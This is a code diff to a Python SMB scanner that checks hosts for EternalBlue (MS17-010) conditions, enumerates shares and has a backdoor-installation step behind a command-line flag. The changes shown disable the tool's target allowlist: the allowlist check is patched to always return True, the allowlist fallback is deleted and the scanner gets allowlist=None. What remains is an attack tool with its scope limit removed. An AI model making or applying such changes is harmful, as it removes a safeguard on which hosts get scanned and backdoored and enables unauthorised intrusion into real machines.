@@ -27,9 +27,10 @@ from backdoor import (
     install_backdoor_cloud,
 )
 
-# ─── Disable allowlist filtering ──────────────────────────────────────────
+# Disable allowlist filtering completely
 PublicIPFirewallSMB._allowed = lambda self, t, nets, ips: True
-# ─── DNS Resolution Helper ────────────────────────────────────────────────
+
+# DNS Resolution Helper
 def resolve_host(hostname):
     """Resolve hostname to IPv4 addresses"""
     try:
@@ -43,7 +44,8 @@ def resolve_host(hostname):
         ))
     except socket.gaierror:
         return []  # Resolution failed
-# ─── Vulnerability Database ───────────────────────────────────────────────
+
+# Vulnerability Database
 VULN_PATTERNS = {
     "eternalblue": {
         "signature": r"(?i)ms17-010|eternalblue",
@@ -67,7 +69,7 @@ VULN_PATTERNS = {
     }
 }
 
-# ─── Debug Helpers ────────────────────────────────────────────────────────
+# Debug Helpers
 def debug_print(title, data, level=1, max_length=500):
     """Enhanced debug printer with formatting and truncation"""
     if not data:
@@ -76,18 +78,15 @@ def debug_print(title, data, level=1, max_length=500):
     header = f"[DEBUG] {title} "
     separator = '=' * (78 - len(header))
     print(f"\n{header}{separator}", file=sys.stderr)
-    
     if isinstance(data, dict):
         for k, v in data.items():
             if isinstance(v, bytes):
                 v = v.hex() if len(v) < 50 else v[:50].hex() + "..."
-            print(f"  {k.upper().ljust(15)}: {str(v)[:max_length]}", 
-                  file=sys.stderr)
+            print(f"  {k.upper().ljust(15)}: {str(v)[:max_length]}", file=sys.stderr)
     elif isinstance(data, str):
         print(f"  {data[:max_length]}", file=sys.stderr)
     else:
         print(f"  {str(data)[:max_length]}", file=sys.stderr)
-    
     print("=" * 78, file=sys.stderr)
 
 def log_exception(context):
@@ -191,7 +190,84 @@ def check_exploit_conditions(scan_data):
     
     return conditions
 
-# ─── Main ─────────────────────────────────────────────────────────────────
+# NEW FUNCTION: Print host scan results
+def print_host_result(host, result, host_map):
+    """Print formatted results for a single host"""
+    # Show original hostname if resolved
+    display_host = host
+    if host in host_map and host_map[host] != host:
+        display_host = f"{host} ({host_map[host]})"
+    
+    print(f"\nHost: {display_host}")
+    
+    # Handle scan errors
+    if "error" in result:
+        print(f"  Error: {result['error']}")
+        return
+    
+    # Print NBNS status
+    if "nbns" in result:
+        print(f"  NBNS: {'positive' if result['nbns'] else 'negative'}")
+    
+    # Print SMB inferred status
+    if "smb_inferred" in result:
+        print(f"  SMB Inferred: {result['smb_inferred']}")
+    
+    # Print port statuses
+    if "ports" in result and result["ports"]:
+        print("  Ports:")
+        for port, data in sorted(result["ports"].items()):
+            state = data.get("state", "unknown")
+            proto = data.get("protocol", "")
+            
+            # Build additional info string
+            info_parts = []
+            
+            # SMB-specific info
+            if "smb" in data:
+                info_parts.append(f"SMB: {'positive' if data['smb'] else 'negative'}")
+            
+            # QUIC-specific info
+            if "quic" in data:
+                info_parts.append(f"QUIC: {'positive' if data['quic'] else 'negative'}")
+            
+            # Vulnerability info
+            if "vuln" in data:
+                info_parts.append(f"Vuln: response_len={data['vuln'].get('response_len', 'N/A')}")
+            
+            info_str = " - " + ", ".join(info_parts) if info_parts else ""
+            print(f"    {port}/{proto}: {state}{info_str}")
+    
+    # Print any additional data
+    for key in ["os", "smb_version", "encryption"]:
+        if key in result:
+            print(f"  {key.capitalize()}: {result[key]}")
+
+# Share enumeration helper
+def enumerate_and_print_shares(success, json_out=False, quiet=False):
+    """Enumerate SMB shares and print results"""
+    if json_out:
+        share_data = []
+    
+    for r in success:
+        host = r["details"]["host"]
+        try:
+            shares = enumerate_samba_shares(host)
+            if not quiet:
+                print(f"\n[+] Shares on {host}:")
+                for share in shares:
+                    print(f"  {share['name']} ({share.get('type', '?')}): {share.get('access', '?')}")
+            
+            if json_out:
+                share_data.append({"host": host, "shares": shares})
+        except Exception as exc:
+            if not quiet:
+                print(f"  Error enumerating shares: {exc}")
+    
+    if json_out:
+        print(json.dumps(share_data, indent=2))
+
+# Main Function
 def main():
     ap = argparse.ArgumentParser(
         description="SMB vulnerability scanner with enhanced debugging",
@@ -293,16 +369,13 @@ def main():
                 "targets": [h for h in hosts if h not in args.host]
             })
 
-    # fallback to allowlist ranges if nothing specified --------------------
-    allow_nets, allow_ips = PublicIPFirewallSMB._load_allowlist(args.allowlist)
+    # REMOVED ALLOWLIST HANDLING COMPLETELY
+    # Only require explicit targets
     if not hosts and not cidrs:
-        hosts.extend(map(str, allow_ips))
-        cidrs.extend(map(str, allow_nets))
-    if not hosts and not cidrs:
-        print("[ERROR] No targets and no allowlist", file=sys.stderr)
+        print("[ERROR] No targets specified. Please provide targets via --host, --cidr, or --input.", file=sys.stderr)
         sys.exit(1)
 
-    # ─── Parallel DNS resolution ───────────────────────────────────────────
+    # Parallel DNS resolution
     resolved = []
     host_map = {}
     ip_hosts = []
@@ -352,7 +425,7 @@ def main():
         print(f"[DNS] Total targets after resolution: {len(resolved)}", file=sys.stderr)
     hosts = resolved
 
-    # ─── Main scan loop ────────────────────────────────────────────────────
+    # Main scan loop
     first = True
     json_lock = threading.Lock() if args.save else None
     while True:
@@ -368,7 +441,7 @@ def main():
                 break
         
         scanner = PublicIPFirewallSMB(
-            allowlist=args.allowlist,
+            allowlist=None,  # Disabled allowlist
             strategy=args.strategy,
             timeout=args.timeout,
             workers=args.workers,
@@ -478,7 +551,9 @@ def main():
                         if conditions:
                             debug_print("EXPLOIT CONDITIONS", conditions)
         
-        dbg(scanner, success, expanded, args.quiet)
+        if not args.quiet:
+            print(f"[SCAN] Completed: {len(scanner._results)} hosts, "
+                  f"{len(success)} successful, {len(scanner._skipped)} skipped")
 
         # Final JSON save (for asyncio mode or small scans)
         if args.save and (args.asyncio or len(hosts) <= 50):
@@ -514,7 +589,7 @@ def main():
         else:
             enumerate_and_print_shares(success, json_out=args.json, quiet=args.quiet)
 
-        # one-time backdoor install with debugging ---------------------------
+        # Backdoor installation logic (unchanged)
         if first and args.install_backdoor:
             missing = []
             if not args.remote_os:
